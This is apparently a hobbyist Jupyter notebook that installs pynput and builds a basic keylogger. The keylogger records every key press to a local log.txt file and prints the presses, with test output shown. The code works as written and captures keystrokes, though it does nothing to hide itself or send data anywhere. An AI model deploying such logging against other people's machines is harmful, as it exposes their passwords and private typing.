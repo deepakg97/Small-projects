{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "587d120c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting pynput\n",
      "  Downloading pynput-1.7.6-py2.py3-none-any.whl (89 kB)\n",
      "Requirement already satisfied: six in c:\\users\\deepa\\anaconda3\\lib\\site-packages (from pynput) (1.16.0)\n",
      "Installing collected packages: pynput\n",
      "Successfully installed pynput-1.7.6\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "pip install pynput"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "f3687f84",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pynput\n",
    "from pynput.keyboard import Key, Listener"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "9bd86af8",
   "metadata": {},
   "outputs": [],
   "source": [
    "keys = []"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "943555d5",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Key.enter released\n",
      "key d was pressed\n",
      "'d' released\n",
      "key a was pressed\n",
      "'a' released\n",
      "key d was pressed\n",
      "'d' released\n",
      "key a was pressed\n",
      "'a' released\n",
      "key n was pressed\n",
      "key j was pressed\n",
      "'n' released\n",
      "key l was pressed\n",
      "key d was pressed\n",
      "'j' released\n",
      "key n was pressed\n",
      "key s was pressed\n",
      "'l' released\n",
      "'d' released\n",
      "'n' released\n",
      "'s' released\n",
      "key f was pressed\n",
      "key a was pressed\n",
      "key j was pressed\n",
      "key l was pressed\n",
      "'j' released\n",
      "key s was pressed\n",
      "'f' released\n",
      "'s' released\n",
      "'l' released\n",
      "'a' released\n",
      "special key Key.esc pressed\n",
      "Key.esc released\n"
     ]
    }
   ],
   "source": [
    "def on_press(key):\n",
    "    \n",
    "    keys.append(key)\n",
    "    write_file(keys)\n",
    "    \n",
    "    try:\n",
    "        print (\"key {} was pressed\".format(key.char))\n",
    "    except AttributeError:\n",
    "        print('special key {} pressed'.format(key))\n",
    "    \n",
    "def write_file(keys):\n",
    "    \n",
    "    with open('log.txt', 'w') as f:\n",
    "        for key in keys:\n",
    "            k = str(key).replace(\"'\", \"\")\n",
    "            f.write(k)\n",
    "            \n",
    "def on_release(key):\n",
    "    print(\"{} released\".format(key))\n",
    "    if key == Key.esc:\n",
    "        return False\n",
    "    \n",
    "with Listener(on_press = on_press, on_release = on_release) as listener:\n",
    "    listener.join()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ce5f487a",
   "metadata": {},
   "outputs": [],
   "source": [
    "dddddadanjldnsfajlsdsa"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
